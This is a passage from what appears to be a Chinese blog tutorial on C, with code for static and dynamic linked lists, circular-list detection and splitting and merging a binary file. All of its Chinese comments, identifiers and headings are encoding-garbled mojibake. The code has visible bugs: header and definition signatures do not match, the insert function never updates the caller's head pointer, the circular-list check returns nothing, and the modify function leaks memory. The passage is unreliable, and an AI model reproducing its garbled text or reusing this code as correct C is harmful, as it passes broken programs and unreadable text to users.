class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="é“¾è¡¨"><a href="#é“¾è¡¨" class="headerlink" title="é“¾è¡¨"></a>é“¾è¡¨</h4><p> å¢åŠ ã€åˆ é™¤ä¸éœ€è¦ç§»åŠ¨ç›´æ¥æ”¹å˜æŒ‡é’ˆçš„æŒ‡å‘   ç¼ºç‚¹ï¼šæŸ¥è¯¢/ä¿®æ”¹æ— æ³•åƒæ•°ç»„å®šä½ï¼Œå¿…é¡»ä½¿ç”¨å¾ªç¯æ–¹å¼è¿›è¡Œå®šä½</p>
<p>(ä¸ºäº†ä¾¿äºç†è§£ å¤šæ•°å‡½æ•°éƒ½ä½¿ç”¨ç´¯ä¸­æ–‡)</p>
<h5 id="é™æ€é“¾è¡¨"><a href="#é™æ€é“¾è¡¨" class="headerlink" title="é™æ€é“¾è¡¨"></a>é™æ€é“¾è¡¨</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span> &#123;</span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line"><span class="type">char</span> s[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span>* lpNext;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">NODE</span> st1, st2, st3, st4;</span><br><span class="line">    st1.num = <span class="number">1</span>;</span><br><span class="line">    st2.num = <span class="number">2</span>;</span><br><span class="line">    st3.num = <span class="number">3</span>;</span><br><span class="line">    st4.num = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">NODE</span>* p = &amp;st1;	<span class="comment">// å¤´èŠ‚ç‚¹</span></span><br><span class="line"></span><br><span class="line">    st1.lpNext = &amp;st2;</span><br><span class="line">    st2.lpNext = &amp;st3;</span><br><span class="line">    st3.lpNext = &amp;st4;</span><br><span class="line">    st4.lpNext = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ é™¤st3  </span></span><br><span class="line">    st2.lpNext = st3.lpNext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ·»åŠ st5åˆ°st4å</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">NODE</span> st5;</span><br><span class="line">    st5.num = <span class="number">100</span>;</span><br><span class="line">    st5.lpNext = <span class="literal">NULL</span>;</span><br><span class="line">    st4.lpNext = &amp;st5;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä¸­é—´æ’å…¥åœ¨st1 st2ä¹‹é—´</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">NODE</span> st6;</span><br><span class="line">    st6.num = <span class="number">6</span>;</span><br><span class="line">    st6.lpNext = &amp;st2;</span><br><span class="line">    st1.lpNext = &amp;st6;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä¿®æ”¹st6çš„num</span></span><br><span class="line">    <span class="keyword">for</span> (p ; p!=<span class="literal">NULL</span> ; p= p-&gt;lpNext)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;num == <span class="number">100</span>) &#123;</span><br><span class="line">                p-&gt;num = <span class="number">20</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, p-&gt;num);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//éå†num</span></span><br><span class="line">    <span class="comment">//while (p) &#123;</span></span><br><span class="line">    <span class="comment">//	printf(&quot;%d\n&quot;, p-&gt;num);</span></span><br><span class="line">    <span class="comment">//	p = p-&gt;lpNext;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="comment">//æˆ–è€…</span></span><br><span class="line">    <span class="comment">/*for (p ; p!=NULL ; p = p-&gt;lpNext)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;%d\n&quot;, p-&gt;num);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="åŠ¨æ€é“¾è¡¨"><a href="#åŠ¨æ€é“¾è¡¨" class="headerlink" title="åŠ¨æ€é“¾è¡¨"></a>åŠ¨æ€é“¾è¡¨</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// linked.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span> &#123;</span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span>* lpNext ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">NODE</span> node;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> æ˜¾ç¤ºé“¾è¡¨å†…å®¹(node* å¤´èŠ‚ç‚¹);</span><br><span class="line"><span class="type">void</span> å°¾éƒ¨æ·»åŠ (node* å¤´èŠ‚ç‚¹, <span class="type">int</span> data);    <span class="comment">//å¤´èŠ‚ç‚¹ èµ·å§‹æ•°æ®åœ°å€</span></span><br><span class="line"><span class="type">void</span> å¤´éƒ¨æ·»åŠ (node* å¤´èŠ‚ç‚¹, <span class="type">int</span> data);</span><br><span class="line"><span class="type">void</span> åˆ é™¤(node* å¤´èŠ‚ç‚¹, <span class="type">int</span> data);</span><br><span class="line"><span class="type">void</span> æ’å…¥(node* å¤´èŠ‚ç‚¹, <span class="type">int</span> newdata, <span class="type">int</span> data);</span><br><span class="line"><span class="type">void</span> ä¿®æ”¹(node* å¤´èŠ‚ç‚¹, <span class="type">int</span> newdata, <span class="type">int</span> data);</span><br><span class="line">node* æŸ¥æ‰¾(node* å¤´èŠ‚ç‚¹, <span class="type">int</span> data);</span><br><span class="line"><span class="type">void</span> æ‰“å°ç¯å½¢åˆ—è¡¨(node* å¤´èŠ‚ç‚¹);</span><br><span class="line"><span class="type">int</span> åˆ¤æ–­æ˜¯å¦ä¸ºç¯å½¢é“¾è¡¨(node* å¤´èŠ‚ç‚¹);</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;linked.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    node* å¤´èŠ‚ç‚¹ = <span class="literal">NULL</span>;</span><br><span class="line">    å°¾éƒ¨æ·»åŠ (&amp;å¤´èŠ‚ç‚¹, <span class="number">1</span>);</span><br><span class="line">    å°¾éƒ¨æ·»åŠ (&amp;å¤´èŠ‚ç‚¹, <span class="number">2</span>);</span><br><span class="line">    å°¾éƒ¨æ·»åŠ (&amp;å¤´èŠ‚ç‚¹, <span class="number">4</span>);</span><br><span class="line">    å°¾éƒ¨æ·»åŠ (&amp;å¤´èŠ‚ç‚¹, <span class="number">6</span>);</span><br><span class="line">    å°¾éƒ¨æ·»åŠ (&amp;å¤´èŠ‚ç‚¹, <span class="number">8</span>);</span><br><span class="line">    å¤´éƒ¨æ·»åŠ (&amp;å¤´èŠ‚ç‚¹, <span class="number">10</span>);</span><br><span class="line">    <span class="comment">//åˆ é™¤(&amp;å¤´èŠ‚ç‚¹, 4);</span></span><br><span class="line">    <span class="comment">//æ’å…¥(&amp;å¤´èŠ‚ç‚¹, 5, 8);</span></span><br><span class="line">    <span class="comment">//ä¿®æ”¹(&amp;å¤´èŠ‚ç‚¹, 20, 6);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//åˆ›å»ºç¯å½¢é“¾è¡¨</span></span><br><span class="line">	node* p = å¤´èŠ‚ç‚¹;</span><br><span class="line">	<span class="keyword">for</span> (p; p-&gt;lpNext!=<span class="literal">NULL</span>; p=p-&gt;lpNext)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	p-&gt;lpNext = å¤´èŠ‚ç‚¹;</span><br><span class="line">	åˆ¤æ–­æ˜¯å¦ä¸ºç¯å½¢é“¾è¡¨(å¤´èŠ‚ç‚¹) ? <span class="built_in">printf</span>(<span class="string">&quot;ç¯å½¢\n&quot;</span>): <span class="built_in">printf</span>(<span class="string">&quot;ä¸æ˜¯ç¯å½¢\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	æ‰“å°ç¯å½¢åˆ—è¡¨(å¤´èŠ‚ç‚¹);</span><br><span class="line">	<span class="comment">//æ˜¾ç¤ºé“¾è¡¨å†…å®¹(å¤´èŠ‚ç‚¹);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//æŸ¥æ‰¾(å¤´èŠ‚ç‚¹, 1) == NULL ? printf(&quot;æœªæ‰¾åˆ°æŸ¥æ‰¾æ•°æ®&quot;) : printf(&quot;æ‰¾åˆ°æ•°æ®ï¼š%dï¼Œåœ°å€æ˜¯ï¼š%p&quot;, æŸ¥æ‰¾(å¤´èŠ‚ç‚¹, 1)-&gt;num, æŸ¥æ‰¾(å¤´èŠ‚ç‚¹, 1));</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> å°¾éƒ¨æ·»åŠ (node** å¤´èŠ‚ç‚¹, <span class="type">int</span> data) &#123;		<span class="comment">//è¿™é‡Œéœ€è¦ä¸€ä¸ªäºŒçº§æŒ‡é’ˆ</span></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„èŠ‚ç‚¹</span></span><br><span class="line">    node* æ–°èŠ‚ç‚¹ = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line">    æ–°èŠ‚ç‚¹-&gt;lpNext = <span class="literal">NULL</span>;</span><br><span class="line">    æ–°èŠ‚ç‚¹-&gt;num = data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*å¤´èŠ‚ç‚¹ == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *å¤´èŠ‚ç‚¹ = æ–°èŠ‚ç‚¹;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">    &#123;</span><br><span class="line">        node* p = *å¤´èŠ‚ç‚¹;	<span class="comment">//å¤‡ä»½ä¸€ä¸ªå¤´èŠ‚ç‚¹ æ–¹ä¾¿åç»­æ“ä½œ</span></span><br><span class="line">        <span class="keyword">while</span> (p-&gt;lpNext !=<span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                p = p-&gt;lpNext;</span><br><span class="line">            &#125;</span><br><span class="line">        p-&gt;lpNext = æ–°èŠ‚ç‚¹;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> å¤´éƒ¨æ·»åŠ (node ** å¤´èŠ‚ç‚¹ ,<span class="type">int</span> data) &#123;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„èŠ‚ç‚¹</span></span><br><span class="line">    node* æ–°èŠ‚ç‚¹ = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line">    æ–°èŠ‚ç‚¹-&gt;lpNext = <span class="literal">NULL</span>;</span><br><span class="line">    æ–°èŠ‚ç‚¹-&gt;num = data;</span><br><span class="line">    <span class="keyword">if</span> (*å¤´èŠ‚ç‚¹ == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *å¤´èŠ‚ç‚¹ = æ–°èŠ‚ç‚¹;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        æ–°èŠ‚ç‚¹-&gt;lpNext = *å¤´èŠ‚ç‚¹;  <span class="comment">//å¤´èŠ‚ç‚¹çš„åœ°å€</span></span><br><span class="line">        *å¤´èŠ‚ç‚¹ = æ–°èŠ‚ç‚¹;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> æ˜¾ç¤ºé“¾è¡¨å†…å®¹(node* å¤´èŠ‚ç‚¹) &#123;</span><br><span class="line">    <span class="keyword">if</span> (å¤´èŠ‚ç‚¹) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ•°æ®ä¸º:%4d,å½“å‰èŠ‚ç‚¹åœ°å€ä¸º:%p,ä¸‹ä¸€ä¸ªèŠ‚ç‚¹åœ°å€ä¸º%p\n&quot;</span>, å¤´èŠ‚ç‚¹-&gt;num, å¤´èŠ‚ç‚¹, å¤´èŠ‚ç‚¹-&gt;lpNext);</span><br><span class="line">        æ˜¾ç¤ºé“¾è¡¨å†…å®¹(å¤´èŠ‚ç‚¹-&gt;lpNext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åŒæŒ‡é’ˆ  p1åœ¨å‰ p2åœ¨å</span></span><br><span class="line"><span class="type">void</span> åˆ é™¤(node** å¤´èŠ‚ç‚¹, <span class="type">int</span> data) &#123;</span><br><span class="line">    node *p1 = <span class="literal">NULL</span>, *p2 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¤‡ä»½ä¸€ä¸ªå¤´èŠ‚ç‚¹ å†è¿›è¡Œåç»­æ“ä½œ</span></span><br><span class="line">    p1 = *å¤´èŠ‚ç‚¹;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p1-&gt;num != data) <span class="comment">//æ‰¾ä¸åˆ°è¦åˆ é™¤çš„æ•°æ®</span></span><br><span class="line">        &#123;</span><br><span class="line">            p2 = p1;</span><br><span class="line">            p1 = p1-&gt;lpNext;		<span class="comment">// p1åœ¨p2å‰ä¸€ä¸ª</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">//è·³å‡º</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p1 != *å¤´èŠ‚ç‚¹) &#123;</span><br><span class="line">        p2-&gt;lpNext = p1-&gt;lpNext;</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>	<span class="comment">//p1åœ¨æœ€å‰é¢ï¼ˆåˆ é™¤å¤´èŠ‚ç‚¹ï¼‰</span></span><br><span class="line">    &#123;</span><br><span class="line">        *å¤´èŠ‚ç‚¹ = p1-&gt;lpNext;</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> æ’å…¥(node **å¤´èŠ‚ç‚¹, <span class="type">int</span> newdata, <span class="type">int</span> data) &#123;</span><br><span class="line">    node* p1 = <span class="literal">NULL</span>, * p2 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–æ’å…¥çš„æ–°èŠ‚ç‚¹</span></span><br><span class="line">    node* æ–°èŠ‚ç‚¹ = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line">    æ–°èŠ‚ç‚¹-&gt;lpNext = <span class="literal">NULL</span>;</span><br><span class="line">    æ–°èŠ‚ç‚¹-&gt;num = newdata;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¤‡ä»½</span></span><br><span class="line">p1 = *å¤´èŠ‚ç‚¹;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (p1) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p1-&gt;num != data)  <span class="comment">//æ‰¾ä¸åˆ°è¦æ‹†å…¥åˆ°å…¶å‰é¢çš„æ•°æ®</span></span><br><span class="line">    &#123;</span><br><span class="line">        p2 = p1;</span><br><span class="line">        p1 = p1-&gt;lpNext;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (p1 == *å¤´èŠ‚ç‚¹) </span><br><span class="line">&#123;</span><br><span class="line">    å¤´èŠ‚ç‚¹ = æ–°èŠ‚ç‚¹;</span><br><span class="line">    æ–°èŠ‚ç‚¹-&gt;lpNext = p1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//å¦‚æœåœ¨ä¸­é—´  p2   æ–°èŠ‚ç‚¹   p1</span></span><br><span class="line">&#123;</span><br><span class="line">    p2-&gt;lpNext = æ–°èŠ‚ç‚¹;</span><br><span class="line">    æ–°èŠ‚ç‚¹-&gt;lpNext = p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> ä¿®æ”¹(node** å¤´èŠ‚ç‚¹, <span class="type">int</span> newdata, <span class="type">int</span> data) &#123;  <span class="comment">//**äºŒçº§æŒ‡é’ˆ ä¿å­˜å¤´èŠ‚ç‚¹çš„åœ°å€ï¼Œä¸æ˜¯ä¸€ä¸ªå¤‡ä»½å‰¯æœ¬ è¿™æ ·åœ¨åé¢mainä¸­ ä½¿ç”¨ä¿®æ”¹(å¤´èŠ‚ç‚¹x,x)æ—¶å¯ä»¥ä¿®æ”¹å¤´èŠ‚ç‚¹çš„å€¼</span></span><br><span class="line">    node* p = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line">p-&gt;lpNext = <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;num = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">p = *å¤´èŠ‚ç‚¹;</span><br><span class="line"><span class="keyword">while</span> (p!= <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;num == data) &#123;</span><br><span class="line">            p-&gt;num = newdata;</span><br><span class="line">            p = p-&gt;lpNext;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            p = p-&gt;lpNext;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node* æŸ¥æ‰¾(node* å¤´èŠ‚ç‚¹,<span class="type">int</span> data) &#123;  <span class="comment">//ä¿®æ”¹å’ŒæŸ¥æ‰¾å·®ä¸å¤š</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*while (å¤´èŠ‚ç‚¹) &#123;</span></span><br><span class="line"><span class="comment">if (å¤´èŠ‚ç‚¹-&gt;num == data) &#123;</span></span><br><span class="line"><span class="comment">return å¤´èŠ‚ç‚¹;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">å¤´èŠ‚ç‚¹ = å¤´èŠ‚ç‚¹-&gt;lpNext;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//æˆ–è€…ä½¿ç”¨for</span></span><br><span class="line">    <span class="keyword">for</span> (å¤´èŠ‚ç‚¹; å¤´èŠ‚ç‚¹!=<span class="literal">NULL</span>; å¤´èŠ‚ç‚¹= å¤´èŠ‚ç‚¹-&gt;lpNext)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (å¤´èŠ‚ç‚¹-&gt;num == data) &#123;</span><br><span class="line">                <span class="keyword">return</span> å¤´èŠ‚ç‚¹;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> æ‰“å°ç¯å½¢åˆ—è¡¨(node* å¤´èŠ‚ç‚¹) &#123;</span><br><span class="line">	node* p = å¤´èŠ‚ç‚¹;</span><br><span class="line">	<span class="keyword">for</span> (p;p-&gt;lpNext != å¤´èŠ‚ç‚¹; p = p-&gt;lpNext)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;æ•°æ®ä¸º:%d, å½“å‰èŠ‚ç‚¹åœ°å€: %p ,ä¸‹ä¸€ä¸ªèŠ‚ç‚¹åœ°å€:% p\n&quot;</span>, p-&gt;num, p, p-&gt;lpNext);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ•°æ®ä¸º:%d, å½“å‰èŠ‚ç‚¹åœ°å€: %p ,ä¸‹ä¸€ä¸ªèŠ‚ç‚¹åœ°å€:% p\n&quot;</span>, p-&gt;num, p, p-&gt;lpNext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>  åˆ¤æ–­æ˜¯å¦ä¸ºç¯å½¢é“¾è¡¨(node* å¤´èŠ‚ç‚¹) 	<span class="comment">//ä½¿ç”¨ä¸¤ä¸ªæŒ‡é’ˆ p1 p2  p1é€Ÿåº¦ä¸º2 p1é€Ÿåº¦ä¸º1 åœ¨æŸä¸€æ—¶åˆ»ä¼šç›¸é‡è¯´æ˜æ˜¯ç¯å½¢é“¾è¡¨</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> Flag = <span class="number">0</span>;	<span class="comment">//é»˜è®¤0 ä¸æ˜¯</span></span><br><span class="line">	node* p1 = <span class="literal">NULL</span>, * p2 = <span class="literal">NULL</span>; </span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (node *p1 =å¤´èŠ‚ç‚¹,*p2=å¤´èŠ‚ç‚¹; p1 !=<span class="literal">NULL</span> &amp;&amp; p2!=<span class="literal">NULL</span>; p1=p1-&gt;lpNext,p2=p2-&gt;lpNext)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//p2 å¿«</span></span><br><span class="line">		p2 = p2-&gt;lpNext;</span><br><span class="line">		<span class="keyword">if</span> (p1 == p2) &#123;</span><br><span class="line">			Flag = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="åˆ†å‰²åˆå¹¶äºŒè¿›åˆ¶æ–‡ä»¶"><a href="#åˆ†å‰²åˆå¹¶äºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="åˆ†å‰²åˆå¹¶äºŒè¿›åˆ¶æ–‡ä»¶"></a>åˆ†å‰²åˆå¹¶äºŒè¿›åˆ¶æ–‡ä»¶</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> path[] = <span class="string">&quot;C:\\Users\\test\\Desktop\\cdemo2.exe&quot;</span>;</span><br><span class="line"><span class="type">char</span>** è·¯å¾„æ•°ç»„ = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–æ–‡ä»¶å­—èŠ‚æ•°</span></span><br><span class="line"><span class="type">int</span> _getSize(<span class="type">char</span>* path) &#123;</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(path, <span class="string">&quot;rb&quot;</span>);	<span class="comment">//rb æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶</span></span><br><span class="line">	<span class="built_in">fseek</span>(p, <span class="number">0</span>, SEEK_END);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> size = <span class="built_in">ftell</span>(p);</span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">	<span class="comment">//printf(&quot;\nåŸæ–‡ä»¶å¤§å°ä¸º:%d\n&quot;,size);</span></span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> åˆ†å‰²(<span class="type">char</span>* path, <span class="type">int</span> num) &#123;</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	<span class="type">int</span> size = _getSize(path);</span><br><span class="line">	<span class="keyword">if</span> (size % num == <span class="number">0</span>) &#123;  <span class="comment">//å­—èŠ‚å¤§å°æ•´é™¤</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			FILE* åˆ†å‰²åçš„æ–‡ä»¶ = <span class="built_in">fopen</span>(è·¯å¾„æ•°ç»„[i],<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; size/num; j++)  &#123;</span><br><span class="line">				<span class="built_in">fputc</span>(<span class="built_in">fgetc</span>(p), åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">fclose</span>(åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;		<span class="comment">//ä¸æ•´é™¤  æœ€åä¸€ä¸ªå•ç‹¬å¤„ç†</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num<span class="number">-1</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			FILE* åˆ†å‰²åçš„æ–‡ä»¶ = <span class="built_in">fopen</span>(è·¯å¾„æ•°ç»„[i], <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; size / (num<span class="number">-1</span>); j++) &#123;</span><br><span class="line">				<span class="built_in">fputc</span>(<span class="built_in">fgetc</span>(p), åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">fclose</span>(åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		FILE* åˆ†å‰²åçš„æ–‡ä»¶ = <span class="built_in">fopen</span>(è·¯å¾„æ•°ç»„[num<span class="number">-1</span>], <span class="string">&quot;wb&quot;</span>); <span class="comment">//æœ€åä¸€ä¸ªè·¯å¾„</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size%(num<span class="number">-1</span>); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">fputc</span>(<span class="built_in">fgetc</span>(p), åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fclose</span>(åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> åˆå¹¶(<span class="type">char</span> * newpath, <span class="type">int</span> num) &#123;</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(newpath, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> len = _getSize(è·¯å¾„æ•°ç»„[i]);</span><br><span class="line">		FILE* pp = <span class="built_in">fopen</span>(è·¯å¾„æ•°ç»„[i], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">fputc</span>(<span class="built_in">fgetc</span>(pp), p);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fclose</span>(pp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"></span><br><span class="line">	è·¯å¾„æ•°ç»„ = <span class="built_in">malloc</span>(<span 